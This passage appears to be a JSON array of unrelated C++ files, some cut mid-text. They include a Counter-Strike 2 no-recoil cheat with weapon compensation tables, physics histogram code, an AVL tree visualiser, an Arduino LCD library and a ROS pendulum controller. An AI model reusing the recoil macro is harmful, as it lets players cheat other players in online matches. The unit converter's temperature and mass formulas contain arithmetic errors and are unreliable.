return true; // If out of bound",
    "#include \"defintions.h\"\n\n//GLOBALS DEFINITION\nbool NoRecoilStatus = true;\n\nint NoRecoilKey = VK_LBUTTON;\nstd::string keyNames[] = { \"LBUTTON\", \"RBUTTON\",  \"MBUTTON\", \"X1BUTTON\", \"X2BUTTON\", \"BACKSPACE\", \"CTRL\", \"ALT\", \"X\", \"Y\", \"Z\" };\nint currentKeyIndex = 1;\n\nint count = 0;\nint returnBackSmoothness = 15;\nint returnDelay = 1;\n\nint CurrentSmoothnessIndex = 1;\nint CurrentSmoothness = 1;\nint CurrentSmoothnessDelay[2] = { 100000, 0 };\nstd::string CurrentSmoothnessName = \" \";\n\nint CurrentWeaponIndex = 1;\nint CurrentSize = 0;\nint* CurrentWeaponX = nullptr;\nint* CurrentWeaponY = nullptr;\nstd::string CurrentGunName = \" \";\n\nfloat CS2sensitivity = 0.0f;\nbool randomizer = false;\ndouble randomNumber = 1.0f;\n\nbool returnBackAfterShooting = true;\n\n\n//the delays of after each shot (it is not uniform because we must include Overhead compensation because depending on which smoothness you have the more function calls you will have to make)\n//some smoothness types need more than one delays such as the soft one (delay was optained through trial and error)\nnamespace SmoothnessConfiguration {\n\t//AK47\n\t//6 elements per gun\n\tnamespace A {\n\t\tint rigid = 1;\n\t\tint rigidDelay[2] = { 100000, 0 };\n\n\t\tint semiRigid = 2;\n\t\tint semiRigidDelay[2] = { 25000, 40000 };\n\n\t\tint soft = 5;\n\t\tint softDelay[2] = { 4000, 20000 };\n\t}\n\t//M4A4\n\tnamespace B {\n\t\tint rigid = 1;\n\t\tint rigidDelay[2] = { 90000, 0 };\n\n\t\tint semiRigid = 2;\n\t\tint semiRigidDelay[2] = { 44500, 0 };\n\n\t\tint soft = 5;\n\t\tint softDelay[2] = { 4000, 10000 };\n\n\t}\n\t//M4A1S\n\tnamespace C {\n\t\tint rigid = 1;\n\t\tint rigidDelay[2] = { 90000, 0 };\n\n\t\tint semiRigid = 2;\n\t\tint semiRigidDelay[2] = { 44500, 0 };\n\n\t\tint soft = 5;\n\t\tint softDelay[2] = { 4000, 10000 };\n\n\t}\n\n\t//I store all gun delay/smoothness configuration in this array for accesibility (bullshit, but this basically allows me to switch smoothness whenever I want with whatever gun selected) each gun has 6 core settings for smoothness and delays\n\t//for each new gun added this array will grow by 6 elements (manually will be added ofcourse...)\n\tint* GunConfArray[] = { &A::rigid,  A::rigidDelay, &A::semiRigid, A::semiRigidDelay, &A::soft, A::softDelay,  &B::rigid, B::rigidDelay, &B::semiRigid, B::semiRigidDelay, &B::soft, B::softDelay, &C::rigid, C::rigidDelay, &C::semiRigid, C::semiRigidDelay, &C::soft, C::softDelay };\n}\n\nnamespace Guns {\n\tconst int AmountOfGuns = 3;\n\t//AK47\n\tnamespace A {\n\t\t//double TotalDelayPerShot = (60.0f / RPM) * 1000.0f;\n\t\tint size = 31;\n\t\tint X[31] = { 0, 0, 0, 0, 0, 40, 40, -40, -90, -30, -20, -20, -20, 0, 80, 30, 50, 50, 30, 20, -20, -10, 0, 10, 0, -40, -90, -70, -30, -10, 0 };\n\t\tint Y[31] = { 0, 40, 40, 80, 80, 80, 80,  20, -10, 20, 0, 0, -10, 20, 30, -10, 20, 0, -10, -10, 10, 10, 10, 0, 10, -10, 0, -50, 10, -10, 0 };\n\t}\n\t//M4A4\n\tnamespace B {\n\t\tint size = 31;\n\t\tint X[31] = { 0, 0, 0, 0, 0, -10, 10, 20, 20, 30, -40, -40, -40, -40, -40, -50, 0, 30, 30, 20, 60, 30, 40, 20, 10, 0, 0, 10, 10, 0, 0 };\n\t\tint Y[31] = { 0, 10, 30, 40, 40, 60, 60, 60, 30, 20, 20,  20, 0, -10, 0, 10, 10, 0, 0, 0, 10, 0, 0, 10, 0, 10, 10, 0, 0, 0, 0 };\n\t}\n\t//M4A1-S\n\tnamespace C {\n\t\tint size = 31;\n\t\tint X[31] = { 0, 0, 0, 0 , 0, -10, 0, 30, 10, 30, -10, -40, -20, -30, -20, -20, -30, -30, 10, -10, 0, 20, 40, 60, 10, 0 };\n\t\tint Y[31] = { 0, 10, 10, 30 , 30, 40, 40, 50, 10, 10, 10, 20, 0, -10, 0, 0, -10, 0, 10, 0, 10, 0, 0, 20, 0, 0 };\n\t}\n}\n\n\n\n//Function definitions\n//these shitty functions ARE CLEARLY NOT clean, they are messy and damn disgusting but they work :\\\n\n\n//This is used to find the total displacement from where you started to where you stopped shooting with norecoil, I use this to calculate where to actually return your mouse to after you shoot\nint FindTotalDisplacement(int* EitherXorY, int CountValueStoppedAt, int XorY) {\n\t//Get the x and y relative displacement coordinates in order to return to right before you started using the no recoil\n\n\t//find x displacement relative to start if identifier (XorY) is 0 \n\tif (XorY == 0) {\n\t\tint TotalXDisplacement = 0;\n\t\tfor (int i = 0; i < CountValueStoppedAt; i++) {\n\t\t\tfor (int j = 0; j < CurrentSmoothness; j++) {\n\t\t\t\tTotalXDisplacement += EitherXorY[i] / CurrentSmoothness;\n\t\t\t}\n\n\t\t}\n\t\tTotalXDisplacement = -(TotalXDisplacement - EitherXorY[0]);\n\t\treturn TotalXDisplacement;\n\t}\n\n\t//find y displacement relative to start if identifier (XorY) is 1 \n\telse if (XorY == 1) {\n\t\tint TotalYDisplacement = 0;\n\t\tfor (int i = 0; i < CountValueStoppedAt; i++) {\n\t\t\tfor (int j = 0; j < CurrentSmoothness; j++) {\n\t\t\t\tTotalYDisplacement += EitherXorY[i] / CurrentSmoothness;\n\t\t\t}\n\t\t}\n\t\tTotalYDisplacement = -(TotalYDisplacement - EitherXorY[0]);\n\t\treturn TotalYDisplacement;\n\t}\n\n\treturn 0;\n}\n\nvoid returnBackAfterComp(int* X, int* Y, int FullfinishOrMidFinish, int delay) {\n\n\tint DivisionXFix = 0;\n\tint DivisionYFix = 0;\n\n\t//After using NoRecoil the program tries to return back your aim to the spot right before NoRecoil started to shot, the return will never be completely accurate as there are innacuracies in the displacem",
    "/**\n *  @copyright Copyright 2016 The J-PET Framework Authors. All rights reserved.\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may find a copy of the License in the LICENCE file.\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n *\n *  @file SDARecoDrawAllCharges.cpp\n */\n\n#include \"JPetRecoDrawAllCharges/SDARecoDrawAllCharges.h\"\n#include \"JPetRecoSignalTools/JPetRecoSignalTools.h\"\n#include <THStack.h>\n#include <TLegend.h>\n#include <sstream>\nusing namespace std;\nSDARecoDrawAllCharges::SDARecoDrawAllCharges(const char *name)\n    : JPetUserTask(name) {}\nSDARecoDrawAllCharges::~SDARecoDrawAllCharges() {}\n\nbool SDARecoDrawAllCharges::init() {\n  DEBUG(\"bool SDARecoDrawAllCharges::init\");\n  const auto &paramBank = getParamBank();\n  fNumberOfPMTs = paramBank.getPMsSize();\n  for (const auto &id_pm_pair : getParamBank().getPMs()) {\n    fIDs.push_back(id_pm_pair.first);\n    std::vector<double> k;\n    fCharges[id_pm_pair.first] = k;\n  }\n  fOutputEvents = new JPetTimeWindow(\"JPetRecoSignal\");\n  return true;\n}\n\nbool SDARecoDrawAllCharges::exec() {\n  DEBUG(\"bool SDARecoDrawAllCharges::exec\");\n  if (auto oldTimeWindow = dynamic_cast<const JPetTimeWindow *const>(fEvent)) {\n    auto n = oldTimeWindow->getNumberOfEvents();\n    for (uint i = 0; i < n; ++i) {\n      auto signal =\n          dynamic_cast<const JPetRecoSignal &>(oldTimeWindow->operator[](i));\n      fCharges[signal.getPM().getID()].push_back(signal.getCharge());\n    }\n  } else {\n    return false;\n  }\n  return true;\n}\n\nbool SDARecoDrawAllCharges::terminate() {\n  DEBUG(\"bool SDARecoDrawAllCharges::terminate\");\n  auto c1 = new TCanvas();\n  // looking for max and min value for all offsets\n  double maximum = -1.e20;\n  double minimum = 1.e20;\n  for (const auto &id_vec_pair : fCharges) {\n    double local_min = JPetRecoSignalTools::min(id_vec_pair.second);\n    double local_max = JPetRecoSignalTools::max(id_vec_pair.second);\n    if (local_max > maximum)\n      maximum = local_max;\n    if (local_min < minimum)\n      minimum = local_min;\n  }\n\n  maximum = maximum + maximum * 0.1;\n  minimum = minimum - minimum * 0.1;\n  //========= I don't understand this place (Rundel) ======\n  maximum = 120;\n  minimum = 0;\n  // ======================================================\n  if (minimum < -100)\n    minimum = -100;\n  int bins = maximum - minimum;\n  if (bins < 0)\n    bins *= -1;\n  for (const auto &id_vec_pair : fCharges) {\n    stringstream ss;\n    ss << id_vec_pair.first;\n    string title = \"Charge for PMT\" + ss.str();\n    fChargeHistos[id_vec_pair.first] =\n        new TH1F(title.c_str(), title.c_str(), bins, minimum, maximum);\n    for (size_t i = 0; i < fCharges[id_vec_pair.first].size(); ++i)\n      fChargeHistos[id_vec_pair.first]->Fill(fCharges[id_vec_pair.first][i], 1);\n  }\n  auto stack = new THStack(\"hs1\", \";Charge [pC];Counts\");\n  int i = 1;\n  for (const auto &id_histo_pair : fChargeHistos) {\n    id_histo_pair.second->GetXaxis()->SetTitle(\"Charge [pC]\");\n    id_histo_pair.second->GetYaxis()->SetTitle(\"Counts\");\n    id_histo_pair.second->SetLineWidth(2);\n    id_histo_pair.second->SetLineColor(i++);\n    stack->Add(id_histo_pair.second);\n  }\n  stack->Draw(\"nostack\");\n  auto leg = c1->BuildLegend();\n  leg->Draw();\n  string title = \"Charges.root\";\n  c1->SaveAs(title.c_str());\n  title = \"Charges.png\";\n  c1->SaveAs(title.c_str());\n  delete c1; // I propose to use shared_ptr here (Rundel)\n  delete stack;\n  return true;\n}\n",
    "#include <iostream>\n#include <queue>\n#include <cmath>\n#include <graphics.h>\n\nusing namespace std;\n\n// AVL Tree node structure\nstruct AVLNode {\n    int data;\n    AVLNode* left;\n    AVLNode* right;\n    int height;\n    int size;\n\n    AVLNode(int x) : data(x), left(nullptr), right(nullptr), height(1), size(1) {}\n};\n\n// Function to get the height of a node\nint getHeight(AVLNode* node) {\n    if (node == nullptr) return 0;\n    return node->height;\n}\n\n// Function to get the size of a node's subtree\nint getSize(AVLNode* node) {\n    if (node == nullptr) return 0;\n    return node->size;\n}\n\n// Function to update the height and size of a node\nvoid updateHeightAndSize(AVLNode* node) {\n    if (node == nullptr) return;\n    node->height = 1 + max(getHeight(node->left), getHeight(node->right));\n    node->size = 1 + getSize(node->left) + getSize(node->right);\n}\n\n// Function to get the balance factor of a node\nint getBalanceFactor(AVLNode* node) {\n    if (node == nullptr) return 0;\n    return getHeight(node->left) - getHeight(node->right);\n}\n\n// Right rotation\nAVLNode* rightRotate(AVLNode* y) {\n    AVLNode* x = y->left;\n    AVLNode* T2 = x->right;\n\n    x->right = y;\n    y->left = T2;\n\n    updateHeightAndSize(y);\n    updateHeightAndSize(x);\n\n    return x;\n}\n\n// Left rotation\nAVLNode* leftRotate(AVLNode* x) {\n    AVLNode* y = x->right;\n    AVLNode* T2 = y->left;\n\n    y->left = x;\n    x->right = T2;\n\n    updateHeightAndSize(x);\n    updateHeightAndSize(y);\n\n    return y;\n}\n\n// Insert a node into the AVL tree\nAVLNode* insert(AVLNode* node, int key) {\n    if (node == nullptr) return new AVLNode(key);\n\n    if (key < node->data)\n        node->left = insert(node->left, key);\n    else if (key > node->data)\n        node->right = insert(node->right, key);\n    else\n        return node; // Duplicate keys not allowed\n\n    updateHeightAndSize(node);\n\n    int balance = getBalanceFactor(node);\n\n    // Left Left Case\n    if (balance > 1 && key < node->left->data)\n        return rightRotate(node);\n\n    // Right Right Case\n    if (balance < -1 && key > node->right->data)\n        return leftRotate(node);\n\n    // Left Right Case\n    if (balance > 1 && key > node->left->data) {\n        node->left = leftRotate(node->left);\n        return rightRotate(node);\n    }\n\n    // Right Left Case\n    if (balance < -1 && key < node->right->data) {\n        node->right = rightRotate(node->right);\n        return leftRotate(node);\n    }\n\n    return node;\n}\n\n// Function to print the AVL tree\nvoid printTree(int x, int y, AVLNode* root, int level) {\n    if (!root) return;\n\n    char str[20];\n    sprintf(str, \"%d (BF:%d)\", root->data, getBalanceFactor(root));\n\n    int radius = 20;  // Node radius\n\n    setcolor(COLOR(144, 238, 144));  // Light Green for node\n    setfillstyle(SOLID_FILL, COLOR(144, 238, 144));\n    circle(x, y, radius);\n    floodfill(x, y, COLOR(144, 238, 144));\n\n    setcolor(WHITE);  // White for text\n    outtextxy(x - 15, y - 8, str);  // Adjusted text position\n\n    setcolor(RED);  // Red for node border\n    circle(x, y, radius);\n\n    int treeHeight = getHeight(root);\n    int offset = 300 / pow(2, level + 1);\n    int yOffset = 50;\n\n    if (root->left) {\n        setcolor(COLOR(255, 255, 0));  // Yellow for lines\n        line(x, y + radius + 5, x - offset - (level * 20), y + yOffset);\n        printTree(x - offset - (level * 20), y + yOffset, root->left, level + 1);\n    }\n    if (root->right) {\n        setcolor(COLOR(255, 255, 0));  // Yellow for lines\n        line(x, y + radius + 5, x + offset + (level * 20), y + yOffset);\n        printTree(x + offset + (level * 20), y + yOffset, root->right, level + 1);\n    }\n}\n\n\nvoid drawNode(int x, int y, int data) {\n    setcolor(WHITE);\n    setfillstyle(SOLID_FILL, CYAN);\n    fillellipse(x, y, 20, 20);\n    \n    setbkcolor(CYAN);\n    setcolor(WHITE);\n    char num[5];\n    sprintf(num, \"%d\", data);\n    outtextxy(x - 10, y - 5, num);\n}\n\n// Modified function to visualize and update the AVL tree with increased gap between root's immediate children\nvoid visualizeAndUpdateTree(AVLNode* root, int x = 400, int y = 100, int level = 0) {\n    if (root == NULL) return;\n\n    int baseHorizontalSpacing = 50;\n    int horizontalSpacing = (level == 0) ? 150 : baseHorizontalSpacing; // Increased spacing for root's immediate children\n    int verticalSpacing = 50;\n\n    // Recursively draw the left and right subtrees\n    if (root->left != NULL) {\n        int childX = (level == 0) ? x - horizontalSpacing : x - baseHorizontalSpacing * (level + 1);\n        line(x, y, childX, y + verticalSpacing);\n        visualizeAndUpdateTree(root->left, childX, y + verticalSpacing, level + 1);\n    }\n\n    if (root->right != NULL) {\n        int childX = (level == 0) ? x + horizontalSpacing : x + baseHorizontalSpacing * (level + 1);\n        line(x, y, childX, y + verticalSpacing);\n        visualizeAndUpdateTree(root->right, childX, y + verticalSpacing, level + 1);\n    }\n\n    // Draw the current node\n    drawNode(x, y, root->data);\n}\n\n// Inorder traversal\nvoid inord",
    "#include <iostream>\r\n#include <stdlib.h>\r\n#ifdef _WIN32\r\n#include <windows.h>\r\n#else\r\n#include <unistd.h>\r\n#endif\r\nusing namespace std;\r\n\r\n//Error handling for doubles\r\nvoid valueInputErrorHandling(){\r\n    while (cin.fail()){\r\n        cin.clear();\r\n        cin.ignore(1000, '\\n');\r\n        cout << \"Invalid input! Please enter a numeric value!\" << endl;\r\n    }\r\n}\r\n\r\nvoid toHours(double minutes){\r\n    if (cin.fail() || minutes < 0){\r\n        cout << \"Time cannot be negative!\" << endl;\r\n        valueInputErrorHandling();\r\n    }\r\n    else{\r\n       cout << minutes << \" minute(s) is/are \" << minutes / 60 << \" hours\" << endl;\r\n    }\r\n}\r\n\r\nvoid toMinutes(double hours){\r\n    if (cin.fail() || hours < 0){\r\n        cout << \"Time cannot be negative!\" << endl;\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n        cout << hours << \" hour(s) is/are \" << hours * 60 << \" minutes\" << endl;\r\n    }\r\n}\r\n\r\nvoid hoursToSeconds(double hours){\r\n    if (cin.fail() || hours < 0){\r\n        cout << \"Time cannot be negative!\" << endl;\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n        cout << hours << \" hour(s) is/are \" << hours * 3600 << \" second(s)\" << endl;\r\n    }\r\n}\r\n\r\nvoid minutesToSeconds(double minutes){     //option 4\r\n    if (cin.fail() || minutes < 0){\r\n        cout << \"Time cannot be negative!\" << endl;\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n        cout << minutes << \" minute(s) is/are \" << minutes * 60 << \" second(s)\" << endl;\r\n    }\r\n}\r\n\r\n//convert multiple units\r\nvoid convertAll(double hours, double minutes, double seconds){\r\n    if (cin.fail() || hours < 0 || minutes < 0 || seconds < 0){\r\n        cout << \"Time cannot be negative!\" << endl;\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n        toHours(minutes);\r\n        toMinutes(hours);\r\n        hoursToSeconds(hours);\r\n        minutesToSeconds(minutes);\r\n        cout << seconds << \" second(s) is/are \" << seconds / 60 << \" minute(s)\" << endl;\r\n        cout << seconds << \" second(s) is/are \" << seconds / 3600 << \" hour(s)\" << endl;\r\n    }\r\n}\r\n\r\n//converting temperatures (celcius to farenheit)\r\nvoid tempConvert(double celsius, double fahrenheit, double kelvin){\r\n    if (cin.fail()){\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n        cout << celsius << \" Deg C is \" << celsius * (9/5) + 32 << \" Deg F\" << \"\\n\";\r\n        cout << fahrenheit << \" Deg F is \" << (fahrenheit - 32) * 5/9 << \" Deg C\" << \"\\n\";\r\n        cout << celsius << \" Deg C is \" << celsius + 273.15 << \"K\" << \"\\n\";\r\n        cout << fahrenheit << \" Deg F is \" << 5/9 * fahrenheit + 459.67 << \"K\" << \"\\n\";\r\n        cout << kelvin << \"K is \" << kelvin - 273.15 << \" Deg C\" << \"\\n\";\r\n        cout << kelvin << \"K is \" << (kelvin - 273.15) * 1.8 + 32 << \" Deg F\" << endl;\r\n    }\r\n}\r\n\r\nvoid massConvertSI(double grams, double kilograms, double tonnes){\r\n    if (cin.fail()){\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n    cout << grams << \" g is equivalent to \" << grams / 1000 << \" kg\" << '\\n';\r\n    cout << kilograms << \" kg is equivalent to \" << kilograms / 1000 << \" t\" << '\\n';\r\n    cout << tonnes << \" t is equivalent to \" << tonnes * 1000 << \" kg\" << '\\n';\r\n    cout << kilograms << \" kg is equivalent to \" << kilograms * 1000 << \" g\" << '\\n';\r\n    cout << tonnes << \" t is equivalent to \" << tonnes * 1000000 << \" g\" << '\\n';\r\n    cout << grams << \" g is equivalent to \" << grams / 1000000 << \" t\" << endl;\r\n    }\r\n}\r\n\r\nvoid massConvertImperial(double ounce, double pound, double ton){\r\n    if (cin.fail()){\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n        cout << ounce << \" oz is equivalent to \" << ounce / 16 << \" lb\" << '\\n';\r\n        cout << pound << \" lb is equivalent to \" << pound / 2000 << \" tn\" << '\\n';\r\n        cout << ton << \" tn is equivalent to \" << ton * 2000 << \" lb\" << '\\n';\r\n        cout << pound << \" lb is equivalent to \" << pound * 16 << \" oz\" << '\\n';\r\n        cout << ounce << \" oz is equivalent to \" << ounce / 32000 << \" tn\" << endl;\r\n    }\r\n}\r\n\r\nvoid massConvertAll(double grams, double kilograms, double tonnes, double ounce, double pound, double ton){\r\n    if (cin.fail()){\r\n        valueInputErrorHandling();\r\n    }\r\n    else {\r\n        massConvertSI(grams, kilograms, tonnes);\r\n        massConvertImperial(ounce, pound, ton);\r\n        cout << grams << \" g is equivalent to \" << grams / 28.35 << \" oz\" << '\\n';\r\n        cout << grams << \" g is equivalent to \" << grams / 453.6 << \" oz\" << '\\n';\r\n        cout << grams << \" g is equivalent to \" << grams / 907200 << \" tn\" << '\\n';\r\n        cout << kilograms << \" kg is equivalent to \" << kilograms / 35.274 << \" oz\" << '\\n';\r\n        cout << kilograms << \" kg is equivalent to \" << kilograms * 2.205 << \" lb\" << '\\n';\r\n        cout << kilograms << \" kg is equivalent to \" << kilograms / 907.2 << \" tn\" << '\\n';\r\n        cout << tonnes << \" t is equivalent to \" << tonnes * 35270 << \" oz\" << '\\n';\r\n        cout << tonnes << \" t is equivalent to \" << tonnes * 2205 << \" lb\" << '\\n';\r\n        c",
    "// Based on the work by DFRobot\n\n#include \"LiquidCrystal_I2C.h\"\n#include <inttypes.h>\n#if defined(ARDUINO) && ARDUINO >= 100\n\n#include \"Arduino.h\"\n\n#define printIIC(args)\tWire.write(args)\ninline size_t LiquidCrystal_I2C::write(uint8_t value) {\n\tsend(value, Rs);\n\treturn 1;\n}\n\n#else\n#include \"WProgram.h\"\n\n#define printIIC(args)\tWire.send(args)\ninline void LiquidCrystal_I2C::write(uint8_t value) {\n\tsend(value, Rs);\n}\n\n#endif\n#include \"Wire.h\"\n\n\n\n// When the display powers up, it is configured as follows:\n//\n// 1. Display clear\n// 2. Function set: \n//    DL = 1; 8-bit interface data \n//    N = 0; 1-line display \n//    F = 0; 5x8 dot character font \n// 3. Display on/off control: \n//    D = 0; Display off \n//    C = 0; Cursor off \n//    B = 0; Blinking off \n// 4. Entry mode set: \n//    I/D = 1; Increment by 1\n//    S = 0; No shift \n//\n// Note, however, that resetting the Arduino doesn't reset the LCD, so we\n// can't assume that its in that state when a sketch starts (and the\n// LiquidCrystal constructor is called).\n\nLiquidCrystal_I2C::LiquidCrystal_I2C(uint8_t lcd_Addr,uint8_t lcd_cols,uint8_t lcd_rows)\n{\n  _Addr = lcd_Addr;\n  _cols = lcd_cols;\n  _rows = lcd_rows;\n  _backlightval = LCD_NOBACKLIGHT;\n}\n\nvoid LiquidCrystal_I2C::init(){\n\tinit_priv();\n}\n\nvoid LiquidCrystal_I2C::init_priv()\n{\n\tWire.begin();\n\t_displayfunction = LCD_4BITMODE | LCD_1LINE | LCD_5x8DOTS;\n\tbegin(_cols, _rows);  \n}\n\nvoid LiquidCrystal_I2C::begin(uint8_t cols, uint8_t lines, uint8_t dotsize) {\n\tif (lines > 1) {\n\t\t_displayfunction |= LCD_2LINE;\n\t}\n\t_numlines = lines;\n\n\t// for some 1 line displays you can select a 10 pixel high font\n\tif ((dotsize != 0) && (lines == 1)) {\n\t\t_displayfunction |= LCD_5x10DOTS;\n\t}\n\n\t// SEE PAGE 45/46 FOR INITIALIZATION SPECIFICATION!\n\t// according to datasheet, we need at least 40ms after power rises above 2.7V\n\t// before sending commands. Arduino can turn on way befer 4.5V so we'll wait 50\n\tdelay(50); \n  \n\t// Now we pull both RS and R/W low to begin commands\n\texpanderWrite(_backlightval);\t// reset expanderand turn backlight off (Bit 8 =1)\n\tdelay(1000);\n\n  \t//put the LCD into 4 bit mode\n\t// this is according to the hitachi HD44780 datasheet\n\t// figure 24, pg 46\n\t\n\t  // we start in 8bit mode, try to set 4 bit mode\n   write4bits(0x03 << 4);\n   delayMicroseconds(4500); // wait min 4.1ms\n   \n   // second try\n   write4bits(0x03 << 4);\n   delayMicroseconds(4500); // wait min 4.1ms\n   \n   // third go!\n   write4bits(0x03 << 4); \n   delayMicroseconds(150);\n   \n   // finally, set to 4-bit interface\n   write4bits(0x02 << 4); \n\n\n\t// set # lines, font size, etc.\n\tcommand(LCD_FUNCTIONSET | _displayfunction);  \n\t\n\t// turn the display on with no cursor or blinking default\n\t_displaycontrol = LCD_DISPLAYON | LCD_CURSOROFF | LCD_BLINKOFF;\n\tdisplay();\n\t\n\t// clear it off\n\tclear();\n\t\n\t// Initialize to default text direction (for roman languages)\n\t_displaymode = LCD_ENTRYLEFT | LCD_ENTRYSHIFTDECREMENT;\n\t\n\t// set the entry mode\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n\t\n\thome();\n  \n}\n\n/********** high level commands, for the user! */\nvoid LiquidCrystal_I2C::clear(){\n\tcommand(LCD_CLEARDISPLAY);// clear display, set cursor position to zero\n\tdelayMicroseconds(2000);  // this command takes a long time!\n}\n\nvoid LiquidCrystal_I2C::home(){\n\tcommand(LCD_RETURNHOME);  // set cursor position to zero\n\tdelayMicroseconds(2000);  // this command takes a long time!\n}\n\nvoid LiquidCrystal_I2C::setCursor(uint8_t col, uint8_t row){\n\tint row_offsets[] = { 0x00, 0x40, 0x14, 0x54 };\n\tif ( row > _numlines ) {\n\t\trow = _numlines-1;    // we count rows starting w/0\n\t}\n\tcommand(LCD_SETDDRAMADDR | (col + row_offsets[row]));\n}\n\n// Turn the display on/off (quickly)\nvoid LiquidCrystal_I2C::noDisplay() {\n\t_displaycontrol &= ~LCD_DISPLAYON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::display() {\n\t_displaycontrol |= LCD_DISPLAYON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// Turns the underline cursor on/off\nvoid LiquidCrystal_I2C::noCursor() {\n\t_displaycontrol &= ~LCD_CURSORON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::cursor() {\n\t_displaycontrol |= LCD_CURSORON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// Turn on and off the blinking cursor\nvoid LiquidCrystal_I2C::noBlink() {\n\t_displaycontrol &= ~LCD_BLINKON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::blink() {\n\t_displaycontrol |= LCD_BLINKON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// These commands scroll the display without changing the RAM\nvoid LiquidCrystal_I2C::scrollDisplayLeft(void) {\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVELEFT);\n}\nvoid LiquidCrystal_I2C::scrollDisplayRight(void) {\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVERIGHT);\n}\n\n// This is for text that flows Left to Right\nvoid LiquidCrystal_I2C::leftToRight(void) {\n\t_displaymode |= LCD_ENTRYLEFT;\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n}\n\n// This is for text that flows Right to Left\nvoid LiquidCrystal_I2C::r",
    "#include <ros/ros.h>\n#include <control_msgs/JointControllerState.h>\n#include <sensor_msgs/JointState.h>\n#include <std_msgs/Float64.h>\n#include <Eigen/Dense>\n#include <math.h>\n#include <memory>\n\n#include \"controller_base.h\"\n#include \"controller_lqr.h\"\n#include \"controller_mpc.h\"\n\nconst int control_freq = 100;\n\nconst double M = 2.0;\nconst double m = 0.1;\nconst double g = 9.8;\nconst double l = 0.5 / 2.0;\nconst double I = 1.0 / 3.0 * m * l * l;\nconst double b = 0.0;\nconst double P = (M + m) * I + M * m * l * l;\n\nstd::string CONTROLLER;\n\n// A and B matrices\nEigen::Matrix4d A;\nEigen::Matrix<double, 4, 1> B;\n\nEigen::Matrix4d Q;\nEigen::Matrix<double, 1, 1> R;\n\nint main(int argc, char **argv)\n{\n    ros::init(argc, argv, \"Controller\");\n    ros::NodeHandle nh(\"~\");\n\n    std::string default_value = \"LQR\";\n    nh.param(\"controller\", CONTROLLER, default_value);\n    ROS_INFO_STREAM(\"Controller: \" << CONTROLLER);\n    ros::Rate loop_rate(control_freq);\n\n    A << 0, 1, 0, 0,\n        0, -b * (I + m * l * l) / P, m * m * g * l * l / P, 0,\n        0, 0, 0, 1,\n        0, -b * m * l / P, m * g * l * (M + m) / P, 0;\n    B << 0, (I + m * l * l) / P, 0, m * l / P;\n\n    Q << 10.0, 0.0, 0.0, 0.0,\n        0.0, 10.0, 0.0, 0.0,\n        0.0, 0.0, 10.0, 0.0,\n        0.0, 0.0, 0.0, 10.0;\n    R << 0.1;\n\n    std::unique_ptr<InvertedPendulumController> controller;\n    if (CONTROLLER == \"LQR\")\n    {\n        controller = std::make_unique<LQRInvertedPendulumController>(nh, A, B, Q, R);\n    }\n    else if (CONTROLLER == \"MPC\")\n    {\n        controller = std::make_unique<MPCInvertedPendulumController>(nh, A, B, Q, R, 0.02);\n    }\n    else\n    {\n        ROS_ERROR_STREAM(\"Controller \" << CONTROLLER << \" is not available\");\n        exit(1);\n    }\n\n    while (ros::ok())\n    {\n        ros::spinOnce();\n        controller->balance();\n        loop_rate.sleep();\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pomodoro\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
